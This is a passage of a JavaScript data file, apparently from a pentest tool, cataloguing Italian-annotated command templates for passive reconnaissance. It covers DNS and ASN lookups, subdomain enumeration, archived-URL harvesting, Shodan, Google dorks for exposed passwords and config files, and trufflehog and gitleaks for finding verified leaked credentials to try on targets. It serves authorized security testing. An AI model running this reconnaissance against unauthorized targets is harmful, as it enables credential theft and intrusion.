/* data.js — generato da WannaHack il 2026-10-27T14:24:37.426Z */
const COMMANDS = [
  {
    "id": "whois-domain",
    "name": "whois — Informazioni di Dominio",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "WHOIS & ASN",
    "description": "Recupera i dati di registrazione del dominio da un registro pubblico: la societa registrar, le date di creazione e scadenza, i name server e i contatti per gli abusi. È il primo passo della raccolta passiva e non invia alcun traffico al target.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "whois",
      "osint",
      "registrar"
    ],
    "template": "whois <domain>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "HackTricks — External recon methodology",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/external-recon-methodology"
      }
    ],
    "note": "# Output atteso\nI name server rivelano il provider DNS usato e, spesso, l'infrastruttura di hosting associata. Le date e i contatti servono a confermare che il dominio rientri nel perimetro dell'ingaggio."
  },
  {
    "id": "whois-asn",
    "name": "whois — IP, ASN / netblock",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "WHOIS & ASN",
    "description": "Partendo da un indirizzo IP, scopre a chi appartiene la rete che lo contiene: il numero di sistema autonomo (ASN, l'identificativo della rete di un operatore), il blocco di indirizzi annunciato e il nome del proprietario. Serve ad allargare il perimetro, perché rivela tutti gli altri indirizzi che ricadono nella stessa rete del target.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "asn",
      "cymru",
      "netblock",
      "osint"
    ],
    "template": "whois -h whois.cymru.com \" -v <ip>\"",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Cymru ASN",
        "template": "whois -h whois.cymru.com \" -v <ip>\"",
        "description": "Lookup Team Cymru: ASN, prefisso BGP, paese e owner in una riga."
      },
      {
        "id": "plain",
        "label": "Plain whois",
        "template": "whois <ip>",
        "description": "whois classico sull’IP: assegnatario del blocco, range e contatti RIR."
      }
    ],
    "refs": [
      {
        "label": "Team Cymru — IP→ASN mapping",
        "url": "https://team-cymru.com/community-services/ip-asn-mapping/"
      }
    ],
    "note": "# Opzioni\nIl servizio interrogato è quello pubblico di Team Cymru. Lo spazio prima di `-v`, dentro le virgolette, è obbligatorio: è il formato richiesto dal loro servizio.\n# Prossimo passo\nGli altri indirizzi del blocco trovato vanno considerati possibili bersagli, ma solo se rientrano nel perimetro autorizzato dall'ingaggio."
  },
  {
    "id": "dig-records",
    "name": "dig — DNS records",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "DNS Records",
    "description": "Chiede i record DNS del dominio a un resolver pubblico, senza inviare traffico ai server del target. Ogni tipo di record racconta qualcosa di diverso: gli indirizzi, chi gestisce la posta, i server autorevoli della zona e le verifiche dei servizi usati dall'azienda.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dig",
      "dns"
    ],
    "template": "# indirizzi e record principali, uno per tipo (la richiesta ANY oggi viene rifiutata)\ndig +noall +answer <domain> A @1.1.1.1\ndig +noall +answer <domain> AAAA @1.1.1.1\ndig +noall +answer <domain> MX @1.1.1.1\ndig +noall +answer <domain> TXT @1.1.1.1\n\n# name server e autorita della zona\ndig +noall +answer <domain> NS @1.1.1.1\ndig +noall +answer <domain> SOA @1.1.1.1",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutti i record",
        "template": "for r in A AAAA MX NS TXT SOA; do dig +noall +answer <domain> $r @1.1.1.1; done",
        "description": "Cicla A/AAAA/MX/NS/TXT/SOA in un colpo: quadro DNS completo."
      },
      {
        "id": "short",
        "label": "A",
        "template": "dig +short <domain> @1.1.1.1",
        "description": "Solo record A, output pulito. Veloce per risolvere l’host."
      },
      {
        "id": "mx",
        "label": "MX",
        "template": "dig +short mx <domain> @1.1.1.1",
        "description": "Solo MX, mail provider (Google / O365 / on-prem)."
      },
      {
        "id": "txt",
        "label": "TXT / SPF",
        "template": "dig +short txt <domain> @1.1.1.1",
        "description": "TXT/SPF/DKIM/DMARC, SaaS verificati e policy mail."
      },
      {
        "id": "ns",
        "label": "NS",
        "template": "dig +short ns <domain> @1.1.1.1",
        "description": "Nameserver autoritativi, provider DNS e target per lo zone transfer."
      },
      {
        "id": "any",
        "label": "ANY (spesso rifiutato)",
        "template": "dig any <domain> @1.1.1.1",
        "description": "Query ANY: spesso rifiutata dai resolver moderni, resta utile solo come fallback."
      }
    ],
    "refs": [
      {
        "label": "RFC 8482 — minimal ANY responses",
        "url": "https://www.rfc-editor.org/rfc/rfc8482"
      }
    ],
    "note": "# Opzioni\n- `+noall +answer` mostra solo la risposta utile e nasconde il resto dell'output\n- `@1.1.1.1` è il resolver pubblico interrogato, se ne può usare un altro\n# Output atteso\nI record di posta (MX) indicano chi gestisce l'email del dominio. I record di testo (TXT) contengono le politiche anti-spam (SPF e DKIM) e le righe di verifica dei servizi cloud, che rivelano quali piattaforme usa il target.\n# Errori comuni\nLa vecchia richiesta ANY non funziona più: i resolver pubblici la rifiutano, quindi si chiede un tipo di record alla volta."
  },
  {
    "id": "host-lookup",
    "name": "host — quick lookup",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "DNS Records",
    "description": "Risoluzione DNS veloce con un solo comando: restituisce l'indirizzo IPv4, quello IPv6 e il server di posta del dominio. Non usa la richiesta ANY, quindi risponde sempre. Comodo come primo controllo prima di passare a strumenti più completi come dig.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "host",
      "dns"
    ],
    "template": "host <domain>",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ]
  },
  {
    "id": "crtsh",
    "name": "crt.sh — CT log subdomains",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "I registri pubblici di Certificate Transparency elencano i certificati emessi per il dominio, e con essi i sottodomini, compresi quelli interni come dev o staging. È una fonte del tutto passiva: non invia traffico al target.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "crtsh",
      "ct-logs",
      "subdomains",
      "hackertarget"
    ],
    "template": "curl -s 'https://crt.sh/?q=%25.<domain>&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > crtsh.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "crt.sh",
        "template": "curl -s 'https://crt.sh/?q=%25.<domain>&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u > crtsh.txt",
        "description": "CT logs via crt.sh, sottodomini, anche dev/staging. Rimuove i wildcard e deduplica."
      },
      {
        "id": "hackertarget",
        "label": "HackerTarget",
        "template": "curl -s 'https://api.hackertarget.com/hostsearch/?q=<domain>' | cut -d',' -f1 > hackertarget.txt",
        "description": "Interroga l'API di HackerTarget per ottenere gli host noti del dominio. L'API risponde con righe `host,IP` e `cut` tiene solo l'hostname. La versione gratuita è limitata a poche query al giorno per IP; unisci i risultati a `crtsh.txt`."
      }
    ],
    "refs": [
      {
        "label": "crt.sh",
        "url": "https://crt.sh"
      }
    ],
    "note": "# Opzioni\nIl comando estrae i nomi dai certificati, toglie i prefissi jolly e rimuove i duplicati, salvando la lista in `crtsh.txt`.\n# Prossimo passo\nUnisci questa lista a quelle degli altri strumenti e risolvila per tenere solo gli host attivi."
  },
  {
    "id": "subfinder",
    "name": "subfinder — enum subdomains",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "Raccoglie sottodomini da molte fonti pubbliche passive, aggregandole in automatico. Veloce e silenzioso, è uno dei primi strumenti da lanciare per la mappatura dei sottodomini.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "subfinder",
      "projectdiscovery",
      "subdomains"
    ],
    "template": "subfinder -d <domain> -all -silent -o subfinder.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "subfinder — GitHub",
        "url": "https://github.com/projectdiscovery/subfinder"
      }
    ],
    "note": "# Opzioni\n- `-all` attiva tutte le fonti: più copertura ma scansione più lenta\n- le chiavi delle API vanno impostate nel file di configurazione per sfruttare tutte le fonti\n# Prossimo passo\nUnisci il risultato a crt.sh e amass, poi risolvi gli host con dnsx."
  },
  {
    "id": "amass-passive",
    "name": "amass — enum subdomains",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "Enumera i sottodomini in modalita solo passiva: raccoglie da molte fonti pubbliche senza interrogare direttamente i server DNS del target, quindi resta silenzioso. Più lento ma molto completo.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "amass",
      "owasp",
      "subdomains"
    ],
    "template": "amass enum -passive -d <domain> -o amass.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "OWASP Amass — GitHub",
        "url": "https://github.com/owasp-amass/amass"
      }
    ],
    "note": "# Opzioni\n`-passive` evita qualsiasi interrogazione diretta del target. Le fonti e le chiavi delle API si impostano nel file di configurazione.\n# Prossimo passo\nConfronta e unisci i risultati con subfinder e crt.sh."
  },
  {
    "id": "assetfinder",
    "name": "assetfinder — enum subdomains",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "Raccolta di sottodomini leggera e veloce. Va usata insieme a subfinder e amass, unendo poi le liste in un unico elenco da risolvere.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "assetfinder",
      "subdomains"
    ],
    "template": "assetfinder --subs-only <domain> | sort -u > assetfinder.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "assetfinder — GitHub",
        "url": "https://github.com/tomnomnom/assetfinder"
      }
    ]
  },
  {
    "id": "chaos",
    "name": "chaos — enum subdomains",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "Interroga il dataset pubblico di sottodomini Chaos di ProjectDiscovery. Richiede una chiave API gratuita.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "chaos",
      "projectdiscovery",
      "subdomains"
    ],
    "template": "chaos -d <domain> -key <key> -silent -o chaos.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      },
      {
        "key": "key",
        "label": "API key",
        "placeholder": "PDCP_API_KEY"
      }
    ],
    "refs": [
      {
        "label": "chaos-client — GitHub",
        "url": "https://github.com/projectdiscovery/chaos-client"
      }
    ],
    "note": "# Opzioni\nLa chiave si passa con `-key` oppure tramite variabile d'ambiente. C'e un limite di richieste al minuto.\n# Prossimo passo\nAggiungi questi sottodomini alle altre liste prima di risolverli."
  },
  {
    "id": "dnsx-resolve",
    "name": "dnsx — resolve & validate",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Subdomain Enum",
    "description": "Unisce tutte le liste di sottodomini raccolte, rimuove i duplicati e li risolve, tenendo solo gli host attivi con il loro indirizzo. È il ponte tra la raccolta passiva e i bersagli davvero raggiungibili.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "dns"
    ],
    "tags": [
      "dnsx",
      "projectdiscovery",
      "resolve"
    ],
    "template": "cat *.txt | sort -u | dnsx -silent -a -resp | tee resolved.txt",
    "params": [],
    "refs": [
      {
        "label": "dnsx — GitHub",
        "url": "https://github.com/projectdiscovery/dnsx"
      }
    ],
    "note": "# Opzioni\n- `-a -resp` mostra l'indirizzo IP di ogni host che risponde\n- il risultato finale viene salvato in `resolved.txt`\n# Prossimo passo\nGli host attivi trovati sono i bersagli della fase di scansione attiva."
  },
  {
    "id": "waybackurls",
    "name": "waybackurls — archived URLs",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Web Archive",
    "description": "Recupera dalla Wayback Machine tutti gli indirizzi storici del dominio: vecchi punti di accesso, parametri, backup e percorsi ormai rimossi ma ancora utili. È del tutto passivo, non tocca il target.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "waybackurls",
      "wayback",
      "urls"
    ],
    "template": "waybackurls <domain> | sort -u > wayback.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "waybackurls — GitHub",
        "url": "https://github.com/tomnomnom/waybackurls"
      }
    ],
    "note": "# Opzioni\n- di base legge un dominio come argomento; per includere i sottodomini gli si passa la lista risolta sullo standard input\n- la variante CDX interroga direttamente l'API di archive.org, senza bisogno del tool\n# Prossimo passo\nUnisci questa lista a quella di gau e passala al triage degli URL.",
    "variants": [
      {
        "id": "default",
        "label": "dominio",
        "template": "waybackurls <domain> | sort -u > wayback.txt",
        "description": "Tutti gli indirizzi archiviati del dominio."
      },
      {
        "id": "subs",
        "label": "da lista sottodomini",
        "template": "cat resolved.txt | waybackurls | sort -u > wayback.txt",
        "description": "Alimenta waybackurls con la lista di sottodomini gia risolti, per coprirli tutti."
      },
      {
        "id": "cdx",
        "label": "API CDX (senza tool)",
        "template": "curl -s \"http://web.archive.org/cdx/search/cdx?url=*.<domain>/*&output=text&fl=original&collapse=urlkey\" > wayback_cdx.txt",
        "description": "Interroga direttamente l'archivio con la sola API CDX, utile quando il tool non c'è."
      }
    ]
  },
  {
    "id": "gau",
    "name": "gau — getallurls",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Web Archive",
    "description": "Come waybackurls ma pesca gli indirizzi da più archivi (Wayback Machine, Common Crawl, URLScan, AlienVault), quindi copre di più. Il valore vero arriva filtrando la lista: parametri, file JavaScript, estensioni sensibili.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "gau",
      "urls",
      "commoncrawl"
    ],
    "template": "gau --subs <domain> | sort -u > gau.txt",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "refs": [
      {
        "label": "gau — GitHub",
        "url": "https://github.com/lc/gau"
      }
    ],
    "note": "# Opzioni\n- `--subs` include anche i sottodomini\n- `--providers wayback,commoncrawl,otx,urlscan` sceglie le fonti\n- `--mc 200` tiene solo gli indirizzi che rispondevano 200; `--blacklist png,css,...` scarta le estensioni inutili\n- `--threads` aumenta la concorrenza\n# Prossimo passo\nPassa la lista al triage per isolare parametri, file JavaScript ed estensioni sensibili.",
    "variants": [
      {
        "id": "default",
        "label": "con sottodomini",
        "template": "gau --subs <domain> | sort -u > gau.txt",
        "description": "Indirizzi da tutti gli archivi, sottodomini inclusi."
      },
      {
        "id": "providers",
        "label": "scegli le fonti",
        "template": "gau --threads 5 --providers wayback,commoncrawl,otx,urlscan <domain> | sort -u > gau.txt",
        "description": "Controlla quali archivi interrogare e con quanta concorrenza."
      },
      {
        "id": "filter",
        "label": "filtra rumore",
        "template": "gau --subs --mc 200 --blacklist png,jpg,jpeg,gif,css,woff,svg,ico <domain> | sort -u > gau.txt",
        "description": "Tiene solo gli indirizzi utili (risposta 200) e scarta le estensioni statiche inutili."
      },
      {
        "id": "params",
        "label": "solo con parametri",
        "template": "gau --subs <domain> | grep '=' | uro | sort -u > gau_params.txt",
        "description": "Isola subito gli indirizzi con parametri e li ripulisce dai duplicati con uro."
      }
    ]
  },
  {
    "id": "waymore",
    "name": "waymore — archivi (più fonti + corpi)",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Web Archive",
    "description": "Alternativa più completa a gau e waybackurls: pesca da più fonti archivistiche e, in modalità download, salva anche i corpi delle risposte archiviate per cercarvi segreti offline. È più lento ma più esaustivo.",
    "note": "# Opzioni\n- `-mode U` solo gli indirizzi\n- `-mode R` scarica i corpi delle risposte archiviate\n- `-mode B` entrambi\n# Prossimo passo\nSui corpi scaricati cerca a mano chiavi API, token e commenti con grep.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "waymore",
      "archive",
      "osint",
      "recon"
    ],
    "template": "# solo indirizzi archiviati da molte fonti\nwaymore -i <domain> -mode U",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "solo URL",
        "template": "waymore -i <domain> -mode U",
        "description": "Raccoglie gli indirizzi archiviati da tutte le fonti supportate."
      },
      {
        "id": "download",
        "label": "scarica i corpi",
        "template": "waymore -i <domain> -mode B -oU waymore_urls.txt",
        "description": "Oltre agli indirizzi, scarica le risposte archiviate per l'analisi offline."
      }
    ]
  },
  {
    "id": "url-triage",
    "name": "Triage degli URL archiviati",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Web Archive",
    "description": "Gli indirizzi archiviati valgono solo dopo il filtraggio. Questo passo isola quelli con parametri (per il param mining), i file JavaScript (endpoint e segreti) e le estensioni sensibili (backup, config, dump), poi verifica quali rispondono ancora.",
    "note": "# Opzioni\n- `uro` rimuove i duplicati e gli indirizzi equivalenti dalla lista\n- `httpx -mc 200` tiene solo quelli ancora attivi\n# Prossimo passo\nGli indirizzi con parametri alimentano i test di SQL injection e affini; i file JavaScript vanno letti per endpoint nascosti e chiavi.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "uro",
      "httpx",
      "grep",
      "param-mining",
      "recon"
    ],
    "template": "# indirizzi con parametri, ripuliti dai duplicati\ncat wayback.txt gau.txt | sort -u | grep '=' | uro > url_params.txt",
    "params": [],
    "variants": [
      {
        "id": "params",
        "label": "con parametri",
        "template": "cat wayback.txt gau.txt | sort -u | grep '=' | uro > url_params.txt",
        "description": "Isola gli indirizzi con parametri, pronti per i test di injection."
      },
      {
        "id": "js",
        "label": "file JavaScript",
        "template": "cat wayback.txt gau.txt | grep -iE '\\.js(\\?|$)' | sort -u > url_js.txt",
        "description": "Raccoglie i file JavaScript, dove si trovano endpoint nascosti e a volte chiavi."
      },
      {
        "id": "sensitive",
        "label": "estensioni sensibili",
        "template": "cat wayback.txt gau.txt | grep -iE '\\.(bak|old|zip|tar|gz|sql|sqlite|conf|config|env|log|xml|json|ya?ml|pem|key)(\\?|$)' | sort -u > url_sensitive.txt",
        "description": "Filtra backup, dump e file di configurazione lasciati negli archivi."
      },
      {
        "id": "live",
        "label": "solo attivi",
        "template": "cat wayback.txt gau.txt | sort -u | httpx -silent -mc 200 -o url_live.txt",
        "description": "Verifica quali degli indirizzi archiviati rispondono ancora oggi."
      }
    ]
  },
  {
    "id": "theharvester",
    "name": "theHarvester — emails & hosts",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "OSINT & Email",
    "description": "Aggrega email, sottodomini, host e nomi di persone da molte fonti pubbliche. Le email rivelano lo schema dei nomi utente aziendali, utile per costruire le liste di utenti da usare più avanti.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "theharvester",
      "osint",
      "emails"
    ],
    "template": "theHarvester -d <domain> -b all -l 500 -f harvest",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Tutte le fonti",
        "template": "theHarvester -d <domain> -b all | tee theharvester.txt",
        "description": "Tutte le fonti con l'output salvato in `theharvester.txt` tramite `tee`: testo greppabile, invece dei file strutturati di `-f`."
      },
      {
        "id": "free",
        "label": "Senza API key",
        "template": "theHarvester -d <domain> -b crtsh,duckduckgo,bing,otx,rapiddns -l 500",
        "description": "Solo fonti senza API key: veloce e zero setup."
      }
    ],
    "refs": [
      {
        "label": "theHarvester — GitHub",
        "url": "https://github.com/laramies/theHarvester"
      }
    ],
    "note": "# Opzioni\n`-b all` lancia tutti i moduli: alcuni richiedono una chiave API e vengono saltati con un avviso.\n# Output atteso\nLo schema delle email, per esempio nome.cognome, diventa la base delle liste utenti per le fasi di attacco successive."
  },
  {
    "id": "shodan-host",
    "name": "shodan — host lookup",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Shodan / Censys",
    "description": "Mostra tutto ciò che il motore di ricerca Shodan ha già raccolto su un indirizzo IP (porte aperte, banner dei servizi, vulnerabilità note, certificati) senza inviare un solo pacchetto al target.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "shodan",
      "osint"
    ],
    "template": "shodan host <ip>",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "Shodan CLI",
        "url": "https://cli.shodan.io/"
      }
    ],
    "note": "# Opzioni\nLa prima volta va configurata la chiave API con il comando `shodan init`."
  },
  {
    "id": "shodan-search",
    "name": "shodan — search filters",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Shodan / Censys",
    "description": "Cerca in Shodan gli asset esposti filtrando per nome host, nome sul certificato o dati del server. Fa emergere host che usano lo stesso certificato del target, anche se si trovano su indirizzi diversi.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "shodan",
      "osint"
    ],
    "template": "shodan search 'hostname:<domain>'",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      },
      {
        "key": "hash",
        "label": "Hash favicon",
        "placeholder": "-247388890"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "hostname",
        "template": "shodan search 'hostname:<domain>'",
        "description": "Host il cui hostname contiene il dominio (`hostname:`)."
      },
      {
        "id": "cn",
        "label": "cert CN",
        "template": "shodan search 'ssl.cert.subject.CN:<domain>'",
        "description": "Host che hanno il CN del certificato uguale al dominio (`ssl.cert.subject.CN:`): rivela infrastruttura correlata anche su altri IP."
      },
      {
        "id": "ssl",
        "label": "Dati SSL",
        "template": "shodan search 'ssl:<domain>'",
        "description": "Ricerca ampia in tutti i dati SSL/TLS collegati al dominio (`ssl:`)."
      },
      {
        "id": "favicon",
        "label": "favicon hash",
        "template": "shodan search 'http.favicon.hash:<hash>'",
        "description": "Trova host che servono la stessa favicon confrontando l'hash `mmh3` (`http.favicon.hash:`). Utile per scovare staging o mirror su IP diversi. L'hash si calcola con `favfreak` o con uno snippet `mmh3`."
      }
    ],
    "refs": [
      {
        "label": "Shodan search filters",
        "url": "https://www.shodan.io/search/filters"
      }
    ],
    "note": "# Errori comuni\nOgni ricerca consuma quota dell'account. Il filtro sul certificato è spesso il più efficace per trovare altra infrastruttura collegata al target."
  },
  {
    "id": "smap",
    "name": "smap — Shodan-powered nmap",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Shodan / Censys",
    "description": "Restituisce un elenco di porte e servizi in stile nmap prendendo i dati dal database pubblico di Shodan, quindi senza inviare pacchetti al target e senza bisogno di una chiave API. Da un quadro delle porte veloce e del tutto passivo.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "smap",
      "shodan",
      "ports"
    ],
    "template": "smap <ip>",
    "params": [
      {
        "key": "ip",
        "label": "IP / host",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "refs": [
      {
        "label": "Smap — GitHub",
        "url": "https://github.com/s0md3v/Smap"
      }
    ]
  },
  {
    "id": "google-dorks",
    "name": "Google dorks pack",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Google Dorks",
    "description": "Ricerche mirate sui motori di ricerca per far emergere informazioni del dominio esposte pubblicamente. Da provare una alla volta.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "google",
      "dorks",
      "osint"
    ],
    "template": "site:<domain> (filetype:pdf OR filetype:xlsx OR filetype:docx)",
    "params": [
      {
        "key": "domain",
        "label": "Domain",
        "ctx": "domain",
        "placeholder": "example.com"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Documenti",
        "template": "site:<domain> (filetype:pdf OR filetype:xlsx OR filetype:docx)",
        "description": "Documenti pubblici (`pdf`, `xlsx`, `docx`): dai loro metadati si ricavano nomi utente, software e path interni."
      },
      {
        "id": "login",
        "label": "Admin/Login",
        "template": "site:<domain> (inurl:admin OR inurl:login)",
        "description": "Pannelli admin / pagine di login esposte."
      },
      {
        "id": "index",
        "label": "Dir aperte",
        "template": "site:<domain> intitle:\"index of\"",
        "description": "Directory aperte con listing attivo (`index of`)."
      },
      {
        "id": "conf",
        "label": "Configs",
        "template": "site:<domain> (ext:conf OR ext:cnf OR ext:cfg OR ext:env)",
        "description": "File di configurazione trapelati (`conf`, `cnf`, `cfg`, `env`)."
      },
      {
        "id": "secret",
        "label": "Segreti",
        "template": "site:<domain> intext:password",
        "description": "Pagine che contengono la parola `password`: possibili credenziali trapelate."
      },
      {
        "id": "paste",
        "label": "Paste/Git",
        "template": "\"<domain>\" (inurl:pastebin OR inurl:github OR inurl:gitlab)",
        "description": "Menzioni del dominio su Pastebin, GitHub o GitLab: possibile codice o credenziali esposte."
      }
    ],
    "refs": [
      {
        "label": "Google Hacking DB (Exploit-DB)",
        "url": "https://www.exploit-db.com/google-hacking-database"
      }
    ],
    "note": "# Output atteso\n- i documenti pubblici conservano metadati come nomi utente e software usato\n- la ricerca `index of` espone le directory lasciate aperte\n- i dork su file di configurazione e password fanno emergere segreti pubblicati per errore"
  },
  {
    "id": "trufflehog-gh",
    "name": "trufflehog — segreti nel codice",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Code & Secret Leaks",
    "description": "Analizza il codice pubblico del target alla ricerca di chiavi, token e credenziali lasciate nei repository, verificando se sono ancora validi. Oltre a un'intera organizzazione GitHub puo scandire un singolo repository, un'URL git, GitLab o una cartella locale, e guarda tutta la cronologia dei commit, non solo l'ultima versione.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "trufflehog",
      "secrets",
      "github",
      "osint"
    ],
    "template": "trufflehog github --org=<org> --results=verified",
    "params": [
      {
        "key": "org",
        "label": "Org GitHub",
        "placeholder": "acme-corp"
      },
      {
        "key": "repo",
        "label": "Repo URL",
        "placeholder": "https://github.com/acme-corp/app"
      },
      {
        "key": "token",
        "label": "Token GitLab",
        "placeholder": "glpat-xxxxx"
      },
      {
        "key": "path",
        "label": "Cartella locale",
        "placeholder": "./sorgenti"
      }
    ],
    "variants": [
      {
        "id": "org",
        "label": "org GitHub",
        "template": "trufflehog github --org=<org> --results=verified",
        "description": "Scandisce tutti i repository pubblici dell'organizzazione."
      },
      {
        "id": "repo",
        "label": "singolo repo",
        "template": "trufflehog github --repo=<repo> --results=verified",
        "description": "Un solo repository GitHub."
      },
      {
        "id": "git",
        "label": "URL git",
        "template": "trufflehog git <repo> --results=verified",
        "description": "Qualsiasi repository raggiungibile via git, anche fuori da GitHub."
      },
      {
        "id": "gitlab",
        "label": "GitLab",
        "template": "trufflehog gitlab --token=<token> --results=verified",
        "description": "Repository GitLab, con un token di accesso."
      },
      {
        "id": "fs",
        "label": "cartella locale",
        "template": "trufflehog filesystem <path> --results=verified",
        "description": "Una cartella gia scaricata sul disco."
      }
    ],
    "refs": [
      {
        "label": "TruffleHog — GitHub",
        "url": "https://github.com/trufflesecurity/trufflehog"
      }
    ],
    "note": "# Opzioni\n- `--results=verified` mostra solo i segreti verificati come ancora validi tramite le API, che sono la via piu rapida a credenziali funzionanti\n- l'analisi copre l'intera cronologia git: una chiave rimossa resta nei commit vecchi\n# Prossimo passo\nLe credenziali trovate vanno provate sui servizi del target, se rientrano nel perimetro autorizzato."
  },
  {
    "id": "gitleaks",
    "name": "gitleaks — segreti in un repo clonato",
    "category": "info-gathering",
    "subcategory": "passive-recon",
    "group": "Code & Secret Leaks",
    "description": "Scandisce un repository git gia clonato alla ricerca di segreti, analizzando anche tutta la cronologia dei commit: una chiave rimossa in un commit recente resta visibile in quelli vecchi. Alternativa a trufflehog, con regole proprie.",
    "note": "# Opzioni\n- `detect` analizza la cronologia git; `--source` indica la cartella del repository\n- `-v` mostra i dettagli di ogni segreto, `--report-path` salva il report in un file\n# Prossimo passo\nControlla il commit e l'autore del segreto per capire se e ancora in uso, poi prova la credenziale.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "gitleaks",
      "secrets",
      "git"
    ],
    "template": "# scandisce un repo gia clonato, inclusa la cronologia\ngitleaks detect --source <repo> -v",
    "params": [
      {
        "key": "repo",
        "label": "Cartella repo",
        "placeholder": "./repo-clonato"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "scansione",
        "template": "gitleaks detect --source <repo> -v",
        "description": "Analizza il repository e la sua cronologia."
      },
      {
        "id": "report",
        "label": "con report",
        "template": "gitleaks detect --source <repo> --report-path gitleaks.json",
